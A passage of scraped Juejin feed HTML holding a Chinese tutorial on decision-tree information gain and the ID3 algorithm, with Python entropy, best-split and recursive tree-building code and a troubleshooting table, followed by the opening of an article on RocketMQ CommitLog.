itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-200 决策树信息增益详解：信息熵、ID3 选特征与 Python 最佳切分实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:12:38.000Z" title="Fri Jan 02 2026 06:12:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：用信息熵/信息增益解释决策树为何选择某列切分，并用 Python 复现“最佳切分列”。</li>
<li>结论：最大化信息增益 ⇔ 最小化子节点熵的加权平均；ID3 用贪心递归构建树但易偏好多取值特征。</li>
<li>产出：信息增益推导脉络 + 最佳切分/按列切分/递归建树代码骨架 + 常见坑位速查。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d900ea02a964b3e931b559f7ec48c66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=L69xSqit5ljoIa3f2TfxqfEUMO4%3D" alt="大数据-200 决策树信息增益详解：信息熵、ID3 选特征与 Python 最佳切分实现" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e090a54e1fde461fb4a270b3a03fb244~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=6O%2BltzUAB%2FJZ%2F%2F20uP%2B7gNRfMd4%3D" alt="大数据-200 决策树信息增益详解：信息熵、ID3 选特征与 Python 最佳切分实现" loading="lazy"/></p>
<h2 data-id="heading-1">信息增益</h2>
<p>决策树最终的优化目标使得叶节点的总不纯度最低，即对应衡量不纯度的指标最低。
同时我们知道，全局最优树没有办法简单高效的获得，因此此处我们仍然要以局部最优方法来指导建模过程，并通过优化条件的设置，最终在每一步都是局部最优的条件下逐步接近最可能的全局最优解的结果。
而在信息熵指数的指导下，决策树生成过程的局部最优条件也非常好理解：即在选取属性测试条件（attribute test condition）对某节点（数据集）进行切分的时候，尽可能选取使得该节点对应的子节点信息熵最小的特征进行切分。
换言之，就是要求父节点信息熵和子节点信息熵之差要最大。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cdc56c2a9fbf4e41a19c5980c3044b71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=Wk953ZfdHY9PpK1YeynhKFTl2WY%3D" alt="信息增益" loading="lazy"/></p>
<p>也可以用以下公式：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d2e80678d114deeb09c6d64b050485b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=FlPtUFCaxGM23NPrgSlzCFzJZfI%3D" alt="信息增益" loading="lazy"/>
决策树归纳算法通常选择最大化增益的测试条件，因为对所有的测试条件来说，Ent（D）是一个不变的值，所以最大化增益等价于最小化分支节点的不纯性度量的加权平均值。最后，当选择熵作为公式的不纯性度量时，熵的差就是所谓的“信息增益”，即资讯获利（information gain）。</p>
<h2 data-id="heading-2">划分数据集</h2>
<p>分类算法除了需要测量信息熵，还需要对数据集进行有效的划分。信息熵是衡量数据集纯度的重要指标，而数据集划分则是构建决策树的关键步骤。</p>
<p>在了解如何计算信息熵之后，我们可以采用信息增益的方法来评估数据集划分的质量。具体步骤如下：</p>
<ol>
<li>计算当前数据集的总信息熵</li>
<li>对每个候选特征进行以下操作：
<ul>
<li>按照该特征的可能取值将数据集划分为若干子集</li>
<li>计算每个子集的信息熵</li>
<li>计算划分后的加权平均信息熵</li>
<li>计算该特征的信息增益（总信息熵 - 加权平均信息熵）</li>
</ul>
</li>
</ol>
<p>例如，在判断是否批准贷款的数据集中，可能包含"收入"、"信用记录"等特征。我们需要：</p>
<ul>
<li>计算原始数据集的信息熵</li>
<li>对"收入"特征：按高、中、低划分数据集，分别计算各子集的信息熵</li>
<li>对"信用记录"特征：按良好、一般、差划分数据集，分别计算各子集的信息熵</li>
<li>比较各特征的信息增益，选择增益最大的特征作为最优划分标准</li>
</ul>
<p>通过这种基于信息增益的特征选择方法，我们可以确定最佳的划分方式，从而构建出高效的决策树模型。在实际应用中，这种方法被广泛用于客户分类、医疗诊断、风险评估等多个领域。</p>
<h2 data-id="heading-3">数据集最佳切分函数</h2>
<p>划分数据集的最大准则是选择最大信息增益，也就是信息下降最快的方向。
通过手动计算，我们知道：</p>
<ul>
<li>第 0 列的信息增益为 0.42，第 1 列的信息增益为 0.17</li>
<li>所以我们应该选择第 0 列进行切分数据集</li>
</ul>
<p>用 Python 可以通过以下代码来输出每一列的信息增益（了解即可）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 定义信息熵</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">calEnt</span>(<span class="hljs-params">dataSet</span>):
    n = dataSet.shape[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 数据集总行数</span>
    iset = dataSet.iloc[:, -<span class="hljs-number">1</span>].value_counts()  <span class="hljs-comment"># 统计标签的所有类别</span>
    p = iset / n  <span class="hljs-comment"># 统计每一类标签所占比例</span>
    ent = (-p * np.log2(p)).<span class="hljs-built_in">sum</span>()  <span class="hljs-comment"># 计算信息熵</span>
    <span class="hljs-keyword">return</span> ent

<span class="hljs-comment"># 选择最优的列进行切分</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">bestSplit</span>(<span class="hljs-params">dataSet</span>):
    baseEnt = calEnt(dataSet)  <span class="hljs-comment"># 计算原始熵</span>
    bestGain = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化信息增益</span>
    axis = -<span class="hljs-number">1</span>  <span class="hljs-comment"># 初始化最佳切分列</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(dataSet.shape[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>):  <span class="hljs-comment"># 对特征的每一列进行循环</span>
        levels = dataSet.iloc[:, i].value_counts().index  <span class="hljs-comment"># 提取出当前列的所有取值</span>
        ents = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化子节点的信息熵</span>

        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> levels:  <span class="hljs-comment"># 对当前列的每一个取值进行循环</span>
            childSet = dataSet[dataSet.iloc[:, i] == j]  <span class="hljs-comment"># 某一个子节点的 dataframe</span>
            ent = calEnt(childSet)  <span class="hljs-comment"># 计算某一个子节点的信息熵</span>
            ents += (childSet.shape[<span class="hljs-number">0</span>] / dataSet.shape[<span class="hljs-number">0</span>]) * ent  <span class="hljs-comment"># 计算当前列的信息熵</span>

        <span class="hljs-built_in">print</span>(<span class="hljs-string">'第{}列的信息熵为{}'</span>.<span class="hljs-built_in">format</span>(i, ents))
        infoGain = baseEnt - ents  <span class="hljs-comment"># 计算当前列的信息增益</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'第{}列的信息增益为{}\n'</span>.<span class="hljs-built_in">format</span>(i, infoGain))

        <span class="hljs-keyword">if</span> infoGain &gt; bestGain:
            bestGain = infoGain  <span class="hljs-comment"># 选择最大信息增益</span>
            axis = i  <span class="hljs-comment"># 最大信息增益所在列的索引</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"第{}列为最优切分列"</span>.<span class="hljs-built_in">format</span>(axis))
    <span class="hljs-keyword">return</span> axis

</code></pre>
<p>接下来我们验证构造的数据集最佳切分函数返回的结果与手动计算的结果是否一致：</p>
<pre><code class="hljs language-python" lang="python">bestSplit(dataSet)
</code></pre>
<p>执行结果如下所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42fcff620e9547988fbae0f007f2cb84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=gPYqtS%2B6GIaXQWnY6iz7RUTKIfU%3D" alt="数据集最佳切分函数" loading="lazy"/>
也就是说，最大信息熵的所选的特征是分类后熵值最小的特征。
分类后熵值最小的特征恰恰是分类结果一致的特征，而分类结果一致的特征必须是两类样本差异最大的特征。</p>
<h2 data-id="heading-4">按照给定列切分数据集</h2>
<p>通过最佳切分函数返回最佳切分列的索引，我们就可以根据这个索引，构建一个按照给定列切分数据集的函数。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
函数功能：按照给定的列划分数据集
参数说明：
dataSet：原始数据集
axis：指定的列索引
value：指定的属性值
return：redataSet：按照指定列索引和属性值切分后的数据集
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">mySplit</span>(<span class="hljs-params">dataSet, axis, value</span>):
    col = dataSet.columns[axis]
    redataSet = dataSet.loc[dataSet[col] == value, :].drop(col, axis=<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> redataSet

<span class="hljs-comment"># 验证函数：以 axis=0，value=1 为例</span>
mySplit(dataSet, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)

</code></pre>
<p>执行结果如下图所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7349580d70c34ca68a62a46aa2605225~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=efvUjC30JWgprqsBWSt1BxEG%2Fgs%3D" alt="按照给定列切分数据集" loading="lazy"/></p>
<h2 data-id="heading-5">决策树的生成</h2>
<p>目前我们已经学习了从数据集构造决策树算法所需要的子功能模块，其工作原理如下：</p>
<ul>
<li>得到原始数据集，然后基于最好的属性值划分数据集，由于特征可能多于两个，因此可能存在大于两个分支的数据集划分</li>
<li>第一次划分之后，数据集被向下传递到树的分支的下一个节点</li>
<li>在新的节点上，我们可以再次划分数据，因此我们可以采用递归的原则处理数据集。</li>
</ul>
<p>递归约束的条件是：</p>
<ul>
<li>程序遍历完所有划分数据集的属性</li>
<li>每个分支下的所有实例都有相同的分类</li>
<li>当前节点包含的样本合集为空，不能划分</li>
</ul>
<p>在第 2 种情形下，我们把当前节点标记为叶节点，并将其类别设定为该节点所含样本最多的类别，任何到达叶节点的数据必然属于叶节点的分类。
在第 3 种情形下，同样把当前节点标记为叶节点，但将其类别设定为其父节点所含样本最多的类别。</p>
<h2 data-id="heading-6">ID3算法</h2>
<p>ID3 算法原型最早由 J.R. Quinlan 在其1986年的博士论文《Induction of Decision Trees》中提出，这是第一个真正意义上完整、系统的决策树学习算法。该算法基于信息论中的信息增益准则，采用自顶向下的贪心策略递归构建决策树，其理论基础扎实，实现简单直观，因此在机器学习领域获得了广泛应用。</p>
<p>ID3 算法的核心思想是：在决策树的每个非叶节点上，选择当前信息增益最大的属性作为划分标准。具体计算过程如下：</p>
<ol>
<li>计算数据集的初始熵 H(S)</li>
<li>对每个候选属性 A，计算其信息增益 Gain(S,A) = H(S) - Σ(|Sv|/|S|)*H(Sv)</li>
<li>选择信息增益最大的属性作为当前节点的划分属性</li>
<li>对每个属性值分支递归执行上述过程</li>
</ol>
<p>然而，ID3 算法存在几个明显缺陷：</p>
<ol>
<li>倾向于选择取值较多的属性（如"ID"这种唯一标识符）</li>
<li>不能处理连续值属性</li>
<li>没有考虑过拟合问题</li>
<li>不能处理缺失值</li>
</ol>
<p>针对这些问题，Quinlan 在1993年提出了改进的 C4.5 算法，主要改进包括：</p>
<ol>
<li>引入增益率（Gain Ratio）替代信息增益，解决属性偏向问题</li>
<li>增加了对连续值属性的处理能力</li>
<li>采用后剪枝策略防止过拟合</li>
<li>增加了对缺失值的处理机制</li>
</ol>
<p>后续在1998年，Quinlan 又推出了 C5.0 商业版本，进一步提高了算法效率和可扩展性。这种算法演进路径展示了决策树技术从理论到实践的逐步完善过程，也体现了机器学习算法在解决实际问题时的持续优化需求。</p>
<p>ID3 算法的核心是决策树各个节点应用信息增益准则选择特征，递归的构建决策树。具体方法是：</p>
<ul>
<li>从根节点开始，对节点计算所有可能的特征的信息增益。</li>
<li>选择信息增益最大的特征作为节点的特征，由该特征的不同取值建立子节点。</li>
<li>再对子节点调用以上方法，构建决策树。</li>
<li>直到所有特征的信息增益均很小或没有特征可以选择为止，最后得到一颗决策树。</li>
</ul>
<p>具体 Python 的代码实现（了解即可）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
函数功能：基于最大信息增益切分数据集，递归构建决策树
参数说明：
dataSet：原始数据集(最后一列是标签)
return：myTree：字典形式的树
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">createTree</span>(<span class="hljs-params">dataSet</span>):
    featlist = <span class="hljs-built_in">list</span>(dataSet.columns)  <span class="hljs-comment"># 提取出数据集所有的列</span>
    classlist = dataSet.iloc[:, -<span class="hljs-number">1</span>].value_counts()  <span class="hljs-comment"># 获取最后一列类标签</span>
    
    <span class="hljs-comment"># 判断最多标签数目是否等于数据集行数，或者数据集是否只有一列</span>
    <span class="hljs-keyword">if</span> classlist.iloc[<span class="hljs-number">0</span>] == dataSet.shape[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> dataSet.shape[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> classlist.index[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 如果是，返回类标签</span>
    
    axis = bestSplit(dataSet)  <span class="hljs-comment"># 确定当前最佳切分列的索引</span>
    bestfeat = featlist[axis]  <span class="hljs-comment"># 获取该索引对应的特征</span>
    myTree = {bestfeat: {}}  <span class="hljs-comment"># 采用字典嵌套的方式存储树信息</span>
    
    <span class="hljs-keyword">del</span> featlist[axis]  <span class="hljs-comment"># 删除当前特征</span>
    valuelist = <span class="hljs-built_in">set</span>(dataSet.iloc[:, axis])  <span class="hljs-comment"># 提取最佳切分列所有属性值</span>
    
    <span class="hljs-comment"># 对每一个属性值递归建树</span>
    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> valuelist:
        myTree[bestfeat][value] = createTree(mySplit(dataSet, axis, value))
    
    <span class="hljs-keyword">return</span> myTree


<span class="hljs-comment"># 查看运行结果</span>
myTree = createTree(dataSet)
<span class="hljs-built_in">print</span>(myTree)

</code></pre>
<p>执行结果如下所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a115b999629f40c8bd9e6a154db96fa2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767939157&amp;x-signature=iqTpLvMr5%2BraTI18%2Ba%2BfHPd2CwI%3D" alt="决策树的生成" loading="lazy"/></p>
<h2 data-id="heading-7">ID3算法局限性</h2>
<p>ID3 算法的局限性主要源于局部最优化条件，即信息增益的计算方法，其局限性主要是以下几点：</p>
<ul>
<li>分支度越高（分类水平越多）的离散变量往往子节点的总信息熵更小，ID3 是按照某一列进行切分，有一些列的分类可能不会对结果有足够好的指示。极端情况下取 ID 作为切分字段，每个分类的纯度都是 100%，因此这样的分类方式是没有效益的。</li>
<li>不能直接处理连续型变量，若要使用 ID3 处理联系型变量，则首先需要对连续变量进行离散化。</li>
<li>对缺失值较为敏感，使用 ID3 之前需要提前对缺失值进行处理。</li>
<li>没有剪枝的设置，容易导致过拟合，即在训练集上表现很好，测试集上表现很差</li>
</ul>
<p>对于 ID3 的储多优化措施，最终也构成了 C4.5 算法的核心内容。</p>
<h2 data-id="heading-8">C4.5算法</h2>
<p>C4.5 算法与 ID3 算法相似，C4.5 算法对 ID3 算法进行了改进，C4.5 在生成的过程中，用信息增益比准则来选择特征</p>
<h2 data-id="heading-9">错误速查</h2>





















































<table><thead><tr><th>症状</th><th>根因</th><th>定位</th><th>修复</th></tr></thead><tbody><tr><td>熵计算得到 nan 或 inf</td><td>概率为 0 时 log2(0)</td><td>calEnt() 中 p 是否出现 0</td><td>过滤 0 概率：p = p[p&gt;0] 后再算；或加极小值 eps</td></tr><tr><td>信息增益全为 0/很小</td><td>标签列选错、数据被错误过滤导致熵不变</td><td>dataSet.iloc[:, -1] 是否真是标签；子集是否为空</td><td>明确标签列；检查 childSet.shape[0]；空子集跳过</td></tr><tr><td>bestSplit 输出列不稳定</td><td>set() 遍历无序、value_counts().index 顺序影响打印观感</td><td>levels、valuelist 的来源</td><td>用 sorted(levels) 保持确定性；树分支也用排序</td></tr><tr><td>drop(..., axis=1) 报参数错误/告警</td><td>pandas 版本差异或传参习惯不一致</td><td>drop(col, axis=1) 处固定写法</td><td>drop(columns=[col])</td></tr><tr><td>递归建树后结果异常深/过拟合</td><td>无剪枝、离散取值多导致分支爆炸</td><td>createTree() 每层划分分支数</td><td>引入最小样本数/最大深度/信息增益阈值；或切换 C4.5/剪枝策略</td></tr><tr><td>取“ID列/唯一值列”作为最佳特征</td><td>信息增益偏好多取值属性</td><td>观察某列取值数量远大于其他列</td><td>用增益率（C4.5）或预先剔除高基数标识列</td></tr><tr><td>连续值特征无法处理</td><td>代码按离散取值划分levels = value_counts().index 直接枚举</td><td>连续特征</td><td>先分箱离散化；或实现阈值切分（排序+枚举切点）</td></tr></tbody></table>
<h2 data-id="heading-10">其他系列</h2>
<h3 data-id="heading-11">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-132 Java 生态前沿 2025：Spring、Quarkus、GraalVM、CRaC 与云原生落地</strong></p>
<h3 data-id="heading-12">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-207 RabbitMQ Direct 交换器路由：RoutingKey 精确匹配、队列多绑定与日志分流实战</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 已完结，OSS已完结，GuavaCache已完结，EVCache已完结，RabbitMQ正在更新... 深入浅出助你打牢基础！</p>
<h3 data-id="heading-13">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CommitLog顺序写 —— 为什么RoceketMQ所有消息都往一个文件追加？]]></title>    <link>https://juejin.cn/post/7589962224795713574</link>    <guid>https://juejin.cn/post/7589962224795713574</guid>    <pubDate>2026-01-02T06:16:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795713574" data-draft-id="7590503651115892786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CommitLog顺序写 —— 为什么RoceketMQ所有消息都往一个文件追加？"/> <meta itemprop="keywords" content="后端,RocketMQ,面试"/> <meta itemprop="datePublished" content="2026-01-02T06:16:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CommitLog顺序写 —— 为什么RoceketMQ所有消息都往一个文件追加？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:16:31.000Z" title="Fri Jan 02 2026 06:16:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 